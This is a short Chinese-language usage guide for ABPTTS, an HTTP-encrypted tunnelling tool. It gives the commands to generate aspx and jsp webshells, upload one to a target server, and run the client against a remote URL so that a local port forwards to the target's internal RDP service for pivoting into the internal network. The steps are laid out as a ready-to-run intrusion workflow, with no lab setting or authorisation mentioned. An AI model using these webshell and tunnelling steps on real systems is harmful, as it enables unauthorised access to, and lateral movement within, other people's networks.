## 介绍

Abptts是一款基于python2.7的http加密隧道工具，Abptts能做的很多：

1. 通过http加密隧道转发至目标内网下指定的单个TCP端口

2. 通过http加密隧道同时转发至目标内网下的多台机器上的多个tcp端口

3. 把ssh隧道包裹在http加密隧道中传递，对目标二级内网进行穿透

#### 缺点：不支持PHP

## 使用流程

```
git clone https://github.com/nccgroup/ABPTTS.git
pip install pycrypto
pip install httplib2
cd ABPTTS
python abpttsfactory.py ‐o webshell

```

在webshell目录里有aspx、jsp等脚本

将对应格式的脚本上传至测试机

```
python abpttsclient.py -c webshell\config.txt -u "http://www.0-sec.org/abptts.aspx" -f 127.0.0.1:1112/127.0.0.1:3389
mstsc 127.0.0.1:1112

```

设置本地代理 访问内网

